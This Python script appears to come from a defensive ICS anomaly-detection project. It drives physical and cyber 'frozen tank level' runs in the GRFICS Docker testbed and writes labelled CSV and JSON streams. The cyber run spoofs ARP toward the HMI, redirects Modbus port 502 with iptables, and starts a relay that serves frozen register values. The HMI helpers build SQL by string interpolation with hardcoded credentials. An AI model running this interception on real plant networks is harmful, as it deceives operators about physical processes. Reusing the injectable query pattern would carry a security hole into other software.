"""Drive one declared GRFICS run and write its six streams from one clock (ADR 0402).

SCOPE: this is defensive anomaly-detection research, not an attack tool. It runs **only** inside the
self-contained GRFICS Docker testbed (Fortiphyd's open, GPL-3.0 simulator of a chemical plant, built
for exactly this), reaching only that testbed's own containers on their private bridge network. It
never targets a real, third-party or production system, it carries no exploit, and the only
interception it performs is driving the testbed's **own bundled** relay against the testbed's
**own** simulated HMI, to produce a labelled recording for a detector to be measured later. It
cannot act outside the testbed: the pair of runs it accepts is fixed in code and every other seed
is refused before a container is touched.

Usage, from the lab root, with the bridge stack up:

    python scripts/grfics/capture.py 97201      # physical/frozen/tank_level
    python scripts/grfics/capture.py 97206      # cyber/frozen/tank_level

What this file is, and is not:

    * **It drives two runs and refuses the rest.** `97201` and `97206` are the pair ADR 0400
      Decision 4 named; every other seed, including every `973xx` held-back seed, is refused by
      name before a container is touched.
    * **It is not a measurement.** A capture is not a score. Nothing here computes recall, a rate,
      an accuracy or a confidence, nothing reads a frozen row, and `eval_runs/log.jsonl` is not
      appended. ADR 0402 Decision 7.
    * **It does not reimplement the attack.** The cyber run uses Fortiphyd's own validated
      mechanism (`arpspoof`, an `iptables` REDIRECT and `modbus_relay.py --mode 1`) inside the
      attacker container, and records exactly what it ran in `manifest.json`.
    * **It refuses rather than fabricates.** A cyber run whose relay never received the HMI's
      connection is written as refused, not as a capture with missing columns (ADR 0402
      Decision 6).
    * **It never copies GRFICS source here.** The checkout stays under `data/grfics-source/`; only
      the data a run produces is written, under `data/grfics-dev/`.

The corpus is `grfics-v3-bridge`, not `grfics-v3` (ADR 0401). This topology has no router, so no
firewall, Suricata or arpmon evidence exists and none may be claimed from these files.
"""

from __future__ import annotations

import argparse
import csv
import json
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Final

ROOT = Path(__file__).resolve().parents[2]
DEV_DIR = ROOT / "data" / "grfics-dev"

#: The corpus these captures belong to. Never `grfics-v3` (ADR 0401).
CORPUS = "grfics-v3-bridge"

#: ADR 0144's run shape: ten quiet minutes, then twenty minutes of the named event.
QUIET_SECONDS: Final = 10 * 60
EVENT_SECONDS: Final = 20 * 60

#: How often each stream is sampled, in seconds.
SAMPLE_SECONDS: Final = 1.0

#: ADR 0400 Decision 4: the pair, and nothing else.
SUPPORTED_SEEDS: Final[frozenset[int]] = frozenset({97201, 97206})

#: TE_process.cc's sensor fault enum (`SENSOR_FAULT_*`).
FAULT_FROZEN: Final = 1

#: The tag each run freezes, as the engine spells it in `write` inputs.
ENGINE_TAG: Final = "tank_level"

#: The HMI data point that renders the frozen tag (`dataPoints.pointName`).
HMI_POINT: Final = "Level"

#: Every ScadaLTS point bound to the PLC's block, and the register it reads (ADR 0405).
#: `plc/st_files/326339.st:116-128` names the registers; the scaling each device script applies
#: is in `simulation/simulation/remote_io/modbus/*.py`. The order here is the register order.
HMI_TAGS: Final[tuple[tuple[str, int], ...]] = (
    ("AValve", 100),
    ("AFlow", 101),
    ("BValve", 102),
    ("BFlow", 103),
    ("PurgeValve", 104),
    ("PurgeFlow", 105),
    ("ProductValve", 106),
    ("ProductFlow", 107),
    ("Pressure", 108),
    ("Level", 109),
    ("AComp", 110),
    ("BComp", 111),
    ("CComp", 112),
)

#: The register the target occupies, and the block ScadaLTS actually reads.
#: Measured: one FC 04 request for input registers 100..112, thirteen registers.
TARGET_REGISTER: Final = 109
BLOCK_START: Final = 100
BLOCK_COUNT: Final = 13

#: Container names, as the bridge stack runs them.
SIM_CONTAINER: Final = "grfics-sim"
PLC_CONTAINER: Final = "grfics-plc"
HMI_CONTAINER: Final = "grfics-hmi"
ATTACKER_CONTAINER: Final = "grfics-kali"

#: Addresses on the single bridge.
PLC_IP: Final = "192.168.95.2"
HMI_IP: Final = "192.168.95.107"
ATTACKER_IP: Final = "192.168.95.6"

#: ScadaLTS scaling from `simulation/simulation/remote_io/modbus/tank.py`.
LEVEL_FULL_SCALE_PCT: Final = 100.0
PRESSURE_FULL_SCALE_KPA: Final = 3200.0

#: The Modbus/TCP port both the PLC and the relay listen on.
MODBUS_PORT: Final = 502


class RefusedError(RuntimeError):
    """A condition ADR 0401 or ADR 0402 says must stop the capture, not be worked around."""


@dataclass(frozen=True)
class Run:
    """One declared run, as the registry states it.

    Attributes:
        seed: The registry's seed number.
        cause: ``physical`` or ``cyber``.
        mode: The event's mode, always ``frozen`` for this pair.
        target: The signal the event is applied to.
    """

    seed: int
    cause: str
    mode: str
    target: str

    @property
    def directory_name(self) -> str:
        """The per-run directory name, which names cause, mode, target and seed."""
        return f"{self.cause}-{self.mode}-{self.target}-{self.seed}"


#: The two runs ADR 0402 Decision 2 puts in scope, keyed by seed.
RUNS: Final[dict[int, Run]] = {
    97201: Run(97201, "physical", "frozen", ENGINE_TAG),
    97206: Run(97206, "cyber", "frozen", ENGINE_TAG),
}


def resolve_run(seed: int) -> Run:
    """Return the declared run for `seed`, or refuse.

    Args:
        seed: A seed the caller wants driven.

    Returns:
        The run, when it is one of the two ADR 0402 declares.

    Raises:
        RefusedError: The seed is held back, undeclared, or outside the pair.
    """
    if 97301 <= seed <= 97310:
        raise RefusedError(
            f"{seed} is a held-back seed: not generated and not opened until a declaration "
            "names it (ADR 0144). This harness cannot reach it."
        )
    if seed not in RUNS:
        raise RefusedError(
            f"{seed} is not one of the two runs ADR 0402 declares ({sorted(SUPPORTED_SEEDS)}). "
            "The other eight development runs are deliberately not driven; a sweep before the "
            "pair is shown to be distinguishable would spend the corpus to avoid the question "
            "(ADR 0400 Decision 4)."
        )
    return RUNS[seed]


def register_to_level(register: int) -> float:
    """Convert a raw input register to the tank level percentage ScadaLTS displays.

    `tank.py` scales `measured.liquid_level` (0..100 %) onto 0..65535 and clamps it.

    Args:
        register: The raw 16-bit register value.

    Returns:
        The level in percent of capacity.
    """
    return register / 65535.0 * LEVEL_FULL_SCALE_PCT


def register_to_pressure(register: int) -> float:
    """Convert a raw input register to the tank pressure in kPa ScadaLTS displays.

    `tank.py` scales `measured.pressure` (0..3200 kPa) onto 0..65535 and clamps it.

    Args:
        register: The raw 16-bit register value.

    Returns:
        The pressure in kPa.
    """
    return register / 65535.0 * PRESSURE_FULL_SCALE_KPA


def decode_block(registers: list[int]) -> dict[str, float]:
    """Decode the 13-register block ScadaLTS reads into the tags it displays.

    `%IW100`..`%IW112` are the PLC's input registers (`plc/st_files/326339.st:116-128`). Only the
    two tags this pair needs are named; the rest are kept raw so a reader can check the block
    without this script's arithmetic.

    Args:
        registers: The block, starting at `BLOCK_START`.

    Returns:
        The decoded tags, plus every raw register under `raw_<address>`.

    Raises:
        ValueError: The block is not the declared length.
    """
    if len(registers) != BLOCK_COUNT:
        raise ValueError(f"expected {BLOCK_COUNT} registers, got {len(registers)}")
    offset = TARGET_REGISTER - BLOCK_START
    pressure_offset = offset - 1
    decoded: dict[str, float] = {
        "liquid_level": register_to_level(registers[offset]),
        "pressure": register_to_pressure(registers[pressure_offset]),
    }
    for index, value in enumerate(registers):
        decoded[f"raw_{BLOCK_START + index}"] = float(value)
    return decoded


def looks_like_replay(previous: list[int] | None, current: list[int]) -> bool:
    """Return whether two consecutive responses are byte-for-byte identical.

    Fortiphyd's design doc names an exact repeat across poll cycles as the replay signature of a
    frozen read path: real traffic always varies slightly. This records the observation; it does
    not decide that the repeat is an attack.

    Args:
        previous: The previous block, or None on the first sample.
        current: The block just read.

    Returns:
        True when both blocks are non-empty and identical.
    """
    if previous is None or not current:
        return False
    return previous == current


@dataclass
class Sample:
    """One row of a run, as written to the three value CSVs.

    Every sample carries the same `t` so the streams can be joined on it. `t` is the host wall
    clock at the moment the observation was taken, in seconds since the Unix epoch.
    """

    t: float
    phase: str
    values: dict[str, float] = field(default_factory=dict)


def write_csv(path: Path, fieldnames: list[str], rows: list[dict[str, Any]]) -> None:
    """Write rows to `path` as CSV with a fixed header.

    Args:
        path: The file to write.
        fieldnames: The header, in order.
        rows: The rows, each keyed by header name.
    """
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def sha256_of(path: Path) -> str:
    """Return the sha256 of a file's bytes, or an empty string when it is absent."""
    import hashlib

    if not path.is_file():
        return ""
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1 << 20), b""):
            digest.update(chunk)
    return digest.hexdigest()


def docker(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    """Run a docker command against the bridge stack.

    Args:
        *args: Arguments after `docker`.
        check: Whether a non-zero exit raises.

    Returns:
        The completed process.

    Raises:
        RefusedError: Docker could not be found on PATH.
    """
    binary = shutil.which("docker")
    if binary is None:
        raise RefusedError(
            "docker is not on PATH. OrbStack keeps its binaries in ~/.orbstack/bin; export "
            'PATH="$HOME/.orbstack/bin:$PATH" (ADR 0401).'
        )
    return subprocess.run([binary, *args], capture_output=True, text=True, check=check, timeout=120)


#: Reads the engine's true, measured and fault state, all in one request, as JSON on stdout.
_ENGINE_READ = """
import json, socket, sys
sock = socket.create_connection(("127.0.0.1", 55555), timeout=5)
stream = sock.makefile("rw")
stream.write(json.dumps({"request": "read"}) + "\\n")
stream.flush()
sys.stdout.write(stream.readline())
sock.close()
"""

#: Writes one input to the engine. The value arrives as argv[1] as JSON.
_ENGINE_WRITE = """
import json, socket, sys
sock = socket.create_connection(("127.0.0.1", 55555), timeout=5)
stream = sock.makefile("rw")
payload = json.loads(sys.argv[1])
stream.write(json.dumps({"request": "write", "data": {"inputs": payload}}) + "\\n")
stream.flush()
sys.stdout.write(stream.readline())
sock.close()
"""

#: Reads one point's current value from ScadaLTS. The point name arrives as argv[1].
_HMI_READ = """
import subprocess, sys
name = sys.argv[1]
query = (
    "SELECT p.pointValue FROM pointValues p "
    "JOIN dataPoints d ON d.id = p.dataPointId "
    f"WHERE d.pointName = '{name}' ORDER BY p.ts DESC LIMIT 1;"
)
out = subprocess.run(
    ["mariadb", "-uscada", "-pscada", "scadalts", "-N", "-B", "-e", query],
    capture_output=True, text=True,
)
sys.stdout.write(out.stdout.strip())
"""

#: Reads every ScadaLTS point's current value in one query. Emits one tab-separated name/value row
#: per point, which is what `mariadb -N -B` produces.
_HMI_READ_ALL = """
import subprocess, sys
names = sys.argv[1:]
if not names:
    sys.exit(0)
quoted = ",".join("'" + n + "'" for n in names)
query = (
    "SELECT d.pointName, p.pointValue FROM pointValues p "
    "JOIN dataPoints d ON d.id = p.dataPointId "
    f"WHERE d.pointName IN ({quoted}) "
    "AND p.id IN (SELECT MAX(p2.id) FROM pointValues p2 "
    "             JOIN dataPoints d2 ON d2.id = p2.dataPointId "
    f"            WHERE d2.pointName IN ({quoted}) GROUP BY p2.dataPointId);"
)
out = subprocess.run(
    ["mariadb", "-uscada", "-pscada", "scadalts", "-N", "-B", "-e", query],
    capture_output=True, text=True,
)
sys.stdout.write(out.stdout)
"""

#: Reads the HMI's newest archive timestamp, so a stalled archive is visible rather than inferred.
_HMI_ARCHIVE_TS = """
import subprocess, sys
name = sys.argv[1]
query = (
    "SELECT p.ts FROM pointValues p "
    "JOIN dataPoints d ON d.id = p.dataPointId "
    f"WHERE d.pointName = '{name}' ORDER BY p.ts DESC LIMIT 1;"
)
out = subprocess.run(
    ["mariadb", "-uscada", "-pscada", "scadalts", "-N", "-B", "-e", query],
    capture_output=True, text=True,
)
sys.stdout.write(out.stdout.strip())
"""


def read_engine() -> dict[str, Any]:
    """Read the engine's true values, measured values and fault state in one request.

    `TE::get_state_json` returns all three in a single response, so the two sides of the tell are
    sampled by one call rather than two that could drift apart (ADR 0402 fact 2).

    Returns:
        The decoded state, with `outputs`, `measured` and `state`.

    Raises:
        RefusedError: The engine did not answer with the three sections this harness relies on.
    """
    result = docker("exec", SIM_CONTAINER, "python3", "-c", _ENGINE_READ, check=False)
    if result.returncode != 0:
        raise RefusedError(f"engine read failed: {result.stderr.strip()}")
    try:
        state: dict[str, Any] = json.loads(result.stdout)
    except json.JSONDecodeError as exc:
        raise RefusedError(f"engine returned unparseable state: {exc}") from exc
    for section in ("outputs", "measured", "state"):
        if section not in state:
            raise RefusedError(f"engine state has no {section!r} section; refusing to guess")
    return state


def write_engine(payload: dict[str, Any]) -> dict[str, Any]:
    """Write inputs to the engine through its normal control interface.

    Args:
        payload: The inputs to set, for example `{"tank_level_fault_mode": 1}`.

    Returns:
        The engine's state after the write.

    Raises:
        RefusedError: The write did not land.
    """
    result = docker(
        "exec", SIM_CONTAINER, "python3", "-c", _ENGINE_WRITE, json.dumps(payload), check=False
    )
    if result.returncode != 0:
        raise RefusedError(f"engine write failed: {result.stderr.strip()}")
    state: dict[str, Any] = json.loads(result.stdout)
    return state


def read_hmi_point(name: str) -> float | None:
    """Read one ScadaLTS point's current value.

    ScadaLTS archives a point only when its value changes, so this reads the live value rather than
    the archive (ADR 0402 finding 5).

    Args:
        name: The point name, for example `Level`.

    Returns:
        The value, or None when the point has no recorded value.
    """
    result = docker("exec", HMI_CONTAINER, "python3", "-c", _HMI_READ, name, check=False)
    text = result.stdout.strip()
    if result.returncode != 0 or not text:
        return None
    try:
        return float(text)
    except ValueError:
        return None


def read_hmi_tags(names: tuple[str, ...] | None = None) -> dict[str, float]:
    """Read every ScadaLTS point bound to the PLC block in one query.

    One query rather than one per tag keeps every point in a sample as close to simultaneous as the
    harness can make it, which matters because the whole question is whether two views agree at the
    same instant (ADR 0405).

    Args:
        names: The point names to read; defaults to every tag in `HMI_TAGS`.

    Returns:
        A mapping from point name to its current value. A point with no recorded value is absent.
    """
    wanted = names if names is not None else tuple(name for name, _ in HMI_TAGS)
    result = docker("exec", HMI_CONTAINER, "python3", "-c", _HMI_READ_ALL, *wanted, check=False)
    values: dict[str, float] = {}
    if result.returncode != 0:
        return values
    # `mariadb -N -B` emits tab-separated columns, one row per point.
    for line in result.stdout.splitlines():
        parts = line.split("\t")
        if len(parts) < 2:
            continue
        try:
            values[parts[0].strip()] = float(parts[1])
        except ValueError:
            continue
    return values


def read_hmi_archive_ts(name: str) -> int | None:
    """Read the newest archive timestamp for one ScadaLTS point.

    Args:
        name: The point name.

    Returns:
        The epoch-milliseconds timestamp, or None when absent.
    """
    result = docker("exec", HMI_CONTAINER, "python3", "-c", _HMI_ARCHIVE_TS, name, check=False)
    text = result.stdout.strip()
    if result.returncode != 0 or not text:
        return None
    try:
        return int(text)
    except ValueError:
        return None


def read_plc_block() -> list[int]:
    """Read the 13-register block the HMI polls, from the ICS side of the PLC.

    This is what a device-level reader sees. On the physical run it equals `measured`; on the cyber
    run it equals `measured` too, because the relay sits between the PLC and the HMI and not
    between the engine and the PLC.

    Returns:
        The registers, starting at `BLOCK_START`.

    Raises:
        RefusedError: The block could not be read.
    """
    script = (
        "from pymodbus.client import ModbusTcpClient\n"
        f"c = ModbusTcpClient({PLC_IP!r}, port={MODBUS_PORT})\n"
        "assert c.connect(), 'connect failed'\n"
        f"r = c.read_input_registers({BLOCK_START}, count={BLOCK_COUNT}, slave=1)\n"
        "c.close()\n"
        "assert not r.isError(), r\n"
        "print(','.join(str(v) for v in r.registers))\n"
    )
    result = docker("exec", SIM_CONTAINER, "python3", "-c", script, check=False)
    if result.returncode != 0:
        raise RefusedError(f"PLC block read failed: {result.stderr.strip()}")
    try:
        return [int(part) for part in result.stdout.strip().split(",") if part]
    except ValueError as exc:
        raise RefusedError(f"PLC block was not integers: {exc}") from exc


def main(argv: list[str] | None = None) -> int:
    """Run the CLI. Returns a process exit code."""
    parser = argparse.ArgumentParser(description="Capture one declared GRFICS run (ADR 0402).")
    parser.add_argument("seed", type=int, help="97201 (physical) or 97206 (cyber)")
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="resolve the run and print the plan without touching a container",
    )
    args = parser.parse_args(argv)

    try:
        run = resolve_run(args.seed)
    except RefusedError as exc:
        print(f"refused: {exc}", file=sys.stderr)
        return 2

    directory = DEV_DIR / run.directory_name
    print(f"{CORPUS}: {run.seed} {run.cause}/{run.mode}/{run.target} -> {directory}")
    print(f"  {QUIET_SECONDS}s quiet, then {EVENT_SECONDS}s of the named event (ADR 0144)")

    if args.dry_run:
        print("  dry run: nothing captured")
        return 0

    outcome = capture_run(run, directory)
    if outcome is not None:
        print(f"  refused: {outcome}", file=sys.stderr)
        return 3
    print(f"  captured to {directory}")
    return 0


def capture_run(run: Run, directory: Path) -> str | None:
    """Drive one run and write its streams.

    Samples the engine (true, measured, fault state), the PLC's register block and the HMI's current
    point value on every tick, all stamped from the host clock. The quiet phase runs first; the
    named event starts at `QUIET_SECONDS` and is held for `EVENT_SECONDS`.

    Args:
        run: The declared run to drive.
        directory: The run directory to write into.

    Returns:
        A refusal reason when the run could not be captured honestly, otherwise None.

    Raises:
        RefusedError: A required read failed, which is a broken stack rather than a refusal.
    """
    directory.mkdir(parents=True, exist_ok=True)
    started = time.time()
    event_start = started + QUIET_SECONDS
    event_end = event_start + EVENT_SECONDS
    total = QUIET_SECONDS + EVENT_SECONDS

    cyber_armed: str | None = None
    if run.cause == "cyber":
        # Bring the relay up now so it is polling before the event, but leave the ARP spoof and the
        # redirect until the event starts. Arming the whole chain here would freeze the quiet phase
        # too, and the quiet phase has to be a live plant for the event to be compared against a
        # baseline (ADR 0406).
        cyber_armed = _arm_cyber_relay_listening()
        if cyber_armed is not None:
            return cyber_armed

    rows: list[dict[str, Any]] = []
    previous_block: list[int] | None = None
    event_started = False
    print(f"  sampling for {total}s; event from t={QUIET_SECONDS}s to t={total}s", flush=True)

    try:
        while True:
            now = time.time()
            elapsed = now - started
            if elapsed > total:
                break

            if not event_started and now >= event_start:
                _start_event(run)
                if run.cause == "cyber" and not _relay_served():
                    # The relay must actually be serving, or the run poses no read-path question.
                    return _cyber_not_armed_message()
                event_started = True
                print(f"  t={elapsed:.0f}s event started", flush=True)
            if event_started and now >= event_end:
                _end_event(run)
                print(f"  t={elapsed:.0f}s event ended", flush=True)
                break

            phase = "event" if now >= event_start else "quiet"
            state = read_engine()
            block = read_plc_block()
            hmi_tags = read_hmi_tags()
            hmi_archive_ts = read_hmi_archive_ts(HMI_POINT)
            decoded = decode_block(block)
            replay = looks_like_replay(previous_block, block)
            previous_block = block

            row: dict[str, Any] = {
                "t": now,
                "elapsed": elapsed,
                "phase": phase,
                "true_liquid_level": float(state["outputs"]["liquid_level"]),
                "true_pressure": float(state["outputs"]["pressure"]),
                "measured_liquid_level": float(state["measured"]["liquid_level"]),
                "measured_pressure": float(state["measured"]["pressure"]),
                "fault_mode": int(state["state"]["tank_level_fault_mode"]),
                "hmi_level": hmi_tags.get(HMI_POINT),
                "hmi_archive_ts": hmi_archive_ts,
                "block_is_replay": replay,
            }
            for name, address in HMI_TAGS:
                row[f"hmi_{name}"] = hmi_tags.get(name)
                row[f"reg_{address}"] = decoded.get(f"raw_{address}")
            rows.append(row)

            remaining = SAMPLE_SECONDS - (time.time() - now)
            if remaining > 0:
                time.sleep(remaining)
    finally:
        _disarm(run)

    if not rows:
        return "no samples were taken; refusing to write an empty capture"

    event_rows = [row for row in rows if row["phase"] == "event"]
    if not event_rows:
        return "the event phase produced no samples; refusing to write a quiet-only capture"

    if run.cause == "cyber":
        refusals = _cyber_evidence_gaps(rows)
        if refusals:
            _write_refusal(directory, run, refusals)
            return refusals

    _write_run(directory, run, rows, event_start, event_end)
    return None


def _start_event(run: Run) -> None:
    """Start the named event for one run.

    The physical runs set the fault on the engine itself, through the same control interface the
    dashboard uses. The cyber run's relay is already listening, so this puts the interception in
    the path — the ARP spoof and the redirect — and the HMI's next poll lands on the relay. Arming
    the interception here rather than before sampling is what keeps the quiet phase live (ADR 0406).
    """
    if run.cause == "physical":
        write_engine({f"{run.target}_fault_mode": FAULT_FROZEN})
    else:
        _intercept_cyber_path()


def _end_event(run: Run) -> None:
    """Clear the named event for one run."""
    if run.cause == "physical":
        write_engine({f"{run.target}_fault_mode": 0})
    else:
        _clear_cyber_interception()


def _disarm(run: Run) -> None:
    """Return the stack to its quiet state regardless of how the run ended."""
    if run.cause == "physical":
        try:
            write_engine({f"{run.target}_fault_mode": 0})
        except RefusedError as exc:
            print(f"  warning: could not clear the fault: {exc}", file=sys.stderr)
    else:
        _teardown_cyber_relay()


def _cyber_not_armed_message() -> str:
    """The refusal returned when the relay was never serving when the event began."""
    return (
        "the cyber relay was not serving when the event began, so this run could not pose the "
        "read-path question; nothing was captured"
    )


def _relay_served() -> bool:
    """Return whether the relay has served at least one block."""
    log = docker(
        "exec", ATTACKER_CONTAINER, "sh", "-c", "cat /tmp/relay.log 2>/dev/null", check=False
    ).stdout
    return "reported=" in log


def _intercept_cyber_path() -> None:
    """Point the HMI's cache for the PLC at the attacker and terminate the connection locally."""
    docker(
        "exec",
        ATTACKER_CONTAINER,
        "iptables",
        "-t",
        "nat",
        "-A",
        "PREROUTING",
        "-p",
        "tcp",
        "--dport",
        str(MODBUS_PORT),
        "-j",
        "REDIRECT",
        "--to-ports",
        str(MODBUS_PORT),
        check=False,
    )
    docker(
        "exec",
        "-d",
        ATTACKER_CONTAINER,
        "sh",
        "-c",
        f"nohup arpspoof -i eth0 -t {HMI_IP} {PLC_IP} > /tmp/arpspoof.log 2>&1 &",
        check=False,
    )


def _clear_cyber_interception() -> None:
    """Remove the ARP spoof and the redirect, leaving the relay listening but out of the path."""
    docker("exec", ATTACKER_CONTAINER, "pkill", "arpspoof", check=False)
    docker("exec", ATTACKER_CONTAINER, "iptables", "-t", "nat", "-F", "PREROUTING", check=False)


def _arm_cyber_relay_listening() -> str | None:
    """Start the relay polling the PLC, without putting it in the HMI's path yet.

    The relay polls from container start so that the frozen value it will serve is taken close to
    the event boundary, not minutes earlier. It is kept out of the path until `_start_event` so the
    quiet phase records a live plant.

    Returns:
        A refusal reason when the relay could not be started, otherwise None.
    """
    _teardown_cyber_relay()
    relay = (
        "cd /opt/cyber_injects && "
        "nohup python3 modbus_relay.py "
        f"--target-host {PLC_IP} --target-port {MODBUS_PORT} "
        f"--register-type input --address {BLOCK_START} --count {BLOCK_COUNT} "
        f"--listen-port {MODBUS_PORT} --mode {FAULT_FROZEN} --interval 0.2 "
        "> /tmp/relay.log 2>&1 &"
    )
    docker("exec", "-d", ATTACKER_CONTAINER, "sh", "-c", relay, check=False)
    time.sleep(5)
    if not _relay_served():
        log = docker(
            "exec", ATTACKER_CONTAINER, "sh", "-c", "cat /tmp/relay.log 2>/dev/null", check=False
        ).stdout
        return (
            "the cyber relay never served a block, so this run cannot pose the read-path question: "
            + (log.strip().splitlines() or ["no relay output"])[-1]
        )
    return None


def _teardown_cyber_relay() -> None:
    """Stop the relay, the ARP spoof and the redirect. Safe to call when nothing is armed."""
    docker("exec", ATTACKER_CONTAINER, "pkill", "-f", "modbus_relay.py", check=False)
    docker("exec", ATTACKER_CONTAINER, "pkill", "arpspoof", check=False)
    docker("exec", ATTACKER_CONTAINER, "iptables", "-t", "nat", "-F", "PREROUTING", check=False)


#: How many samples at the start of the event are allowed to differ while the relay takes over.
#: The HMI polls about once a second and the measured transition is one or two samples; this grace
#: is declared here, before the run, rather than chosen after seeing one (ADR 0406).
TRANSITION_SAMPLES: Final = 10

#: How much the PLC register must move for the run to be able to tell a freeze from a quiet plant.
MIN_REGISTER_MOVEMENT: Final = 0.25


def _cyber_evidence_gaps(rows: list[dict[str, Any]]) -> str:
    """Return what is missing from a cyber run, or the empty string when it is complete.

    A read-path freeze has an exact signature — the HMI stops changing and holds one value while the
    register underneath it keeps moving. The test is therefore *exact constancy after the
    transition window*, not a magnitude threshold. Two earlier attempts used a threshold and each
    refused a real capture: an instantaneous gap (the plant was near equilibrium, so the gap stayed
    under 0.2 while the HMI was demonstrably frozen) and a whole-event spread (a single pre-freeze
    sample made the spread 0.05). Both were measuring the wrong quantity, and widening either to fit
    would have been a constant chosen after seeing a failure (ADR 0406).

    Args:
        rows: Every sample of the run.

    Returns:
        Why the run is not a cyber capture, or the empty string when it is one.
    """
    event_rows = [
        row
        for row in rows
        if row["phase"] == "event"
        and row["hmi_level"] is not None
        and row.get(f"reg_{TARGET_REGISTER}") is not None
    ]
    if not event_rows:
        return "the HMI produced no value during the event, so the read path was never observed"

    settled = event_rows[TRANSITION_SAMPLES:]
    if len(settled) < 2:
        return (
            f"only {len(event_rows)} event samples, too few to see past the "
            f"{TRANSITION_SAMPLES}-sample transition window"
        )

    settled_hmi = [float(row["hmi_level"]) for row in settled]
    frozen_value = settled_hmi[0]
    if any(value != frozen_value for value in settled_hmi):
        distinct = len(set(settled_hmi))
        return (
            f"the HMI kept changing after the transition window ({distinct} distinct values), so "
            "the read path was not frozen; this is a passthrough, not a cyber capture"
        )

    register_values = [
        register_to_level(int(float(row[f"reg_{TARGET_REGISTER}"]))) for row in settled
    ]
    register_spread = max(register_values) - min(register_values)
    if register_spread <= MIN_REGISTER_MOVEMENT:
        return (
            f"the PLC register barely moved during the event (spread {register_spread:.4f}), so a "
            "flat HMI cannot be told from a quiet plant; refusing rather than calling it a freeze"
        )
    return ""


def _write_refusal(directory: Path, run: Run, reason: str) -> None:
    """Write a refusal beside the run so the outcome is visible rather than absent."""
    payload = {
        "corpus": CORPUS,
        "seed": run.seed,
        "cause": run.cause,
        "mode": run.mode,
        "target": run.target,
        "refused": True,
        "reason": reason,
        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    (directory / "refused.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")


def _write_run(
    directory: Path, run: Run, rows: list[dict[str, Any]], event_start: float, event_end: float
) -> None:
    """Write the six streams one run directory carries (ADR 0402 Decision 3)."""
    write_csv(
        directory / "true_values.csv",
        ["t", "elapsed", "phase", "liquid_level", "pressure", "fault_mode"],
        [
            {
                "t": row["t"],
                "elapsed": row["elapsed"],
                "phase": row["phase"],
                "liquid_level": row["true_liquid_level"],
                "pressure": row["true_pressure"],
                "fault_mode": row["fault_mode"],
            }
            for row in rows
        ],
    )
    write_csv(
        directory / "measured_values.csv",
        ["t", "elapsed", "phase", "liquid_level", "pressure", "fault_mode"],
        [
            {
                "t": row["t"],
                "elapsed": row["elapsed"],
                "phase": row["phase"],
                "liquid_level": row["measured_liquid_level"],
                "pressure": row["measured_pressure"],
                "fault_mode": row["fault_mode"],
            }
            for row in rows
        ],
    )
    write_csv(
        directory / "hmi_values.csv",
        ["t", "elapsed", "phase"]
        + [name for name, _ in HMI_TAGS]
        + ["archive_ts", "archive_advancing"],
        [
            {
                "t": row["t"],
                "elapsed": row["elapsed"],
                "phase": row["phase"],
                **{
                    name: "" if row.get(f"hmi_{name}") is None else row[f"hmi_{name}"]
                    for name, _ in HMI_TAGS
                },
                "archive_ts": "" if row["hmi_archive_ts"] is None else row["hmi_archive_ts"],
                "archive_advancing": _archive_advancing(rows, row),
            }
            for row in rows
        ],
    )
    write_csv(
        directory / "modbus.csv",
        ["t", "elapsed", "phase", "source"]
        + [f"reg_{address}" for _, address in HMI_TAGS]
        + ["is_replay"],
        [
            {
                "t": row["t"],
                "elapsed": row["elapsed"],
                "phase": row["phase"],
                "source": "ics_side_block_read",
                **{
                    f"reg_{address}": (
                        "" if row.get(f"reg_{address}") is None else row[f"reg_{address}"]
                    )
                    for _, address in HMI_TAGS
                },
                "is_replay": row["block_is_replay"],
            }
            for row in rows
        ],
    )
    _write_events(directory, run, rows, event_start, event_end)
    _write_manifest(directory, run, rows)


def _archive_advancing(rows: list[dict[str, Any]], row: dict[str, Any]) -> bool:
    """Return whether the HMI's archive advanced since the previous sample.

    ScadaLTS archives a point only when its value changes, so a frozen tag leaves a gap. Recording
    it keeps a stalled archive from being read as a stalled plant (ADR 0402 finding 5).
    """
    index = rows.index(row)
    if index == 0:
        return True
    previous = rows[index - 1]["hmi_archive_ts"]
    current = row["hmi_archive_ts"]
    if previous is None or current is None:
        return True
    return bool(current != previous)


def _write_events(
    directory: Path, run: Run, rows: list[dict[str, Any]], event_start: float, event_end: float
) -> None:
    """Write `events.json` in the shape `data/phos-icssim-dev/*/events.json` uses."""
    first = rows[0]["t"]
    params: dict[str, Any] = {
        "target_register": TARGET_REGISTER,
        "block_start": BLOCK_START,
        "block_count": BLOCK_COUNT,
    }
    if run.cause == "cyber":
        params["mechanism"] = "arp_spoof+iptables_redirect+modbus_relay_frozen"
        params["relay_register"] = TARGET_REGISTER
    else:
        params["mechanism"] = "engine_sensor_fault_frozen"
    events = [
        {
            "kind": "quiet",
            "start": 0.0,
            "end": round(event_start - first, 3),
            "label": "quiet",
            "params": {},
        },
        {
            "kind": f"{run.cause}_frozen",
            "start": round(event_start - first, 3),
            "end": round(event_end - first, 3),
            "label": run.cause,
            "params": params,
        },
    ]
    (directory / "events.json").write_text(json.dumps(events, indent=2) + "\n", encoding="utf-8")


def _write_manifest(directory: Path, run: Run, rows: list[dict[str, Any]]) -> None:
    """Write `manifest.json`, so the run is reproducible and its limits are readable."""
    licence = ROOT / "data" / "grfics-source" / "LICENSE"
    manifest = {
        "corpus": CORPUS,
        "not_this_corpus": "grfics-v3",
        "seed": run.seed,
        "cause": run.cause,
        "mode": run.mode,
        "target": run.target,
        "pinned_commit": "37bdf101f3ad0706a7595bd01d696ce7b84db436",
        "licence_sha256": sha256_of(licence),
        "credit": (
            "GRFICSv3 is Fortiphyd's. Research use permitted by email; Fortiphyd asks for credit. "
            "No GRFICS source is copied into this repository."
        ),
        "command": f"python scripts/grfics/capture.py {run.seed}",
        "clock_source": (
            "host wall clock, time.time(), sampled on every observation; every stream is stamped "
            "from that one clock"
        ),
        "clock_note": (
            "containers were measured within +33 to +77 ms of the host on 2026-11-01; the "
            "sampling error is smaller than the one-second sample interval and is stated rather "
            "than assumed away"
        ),
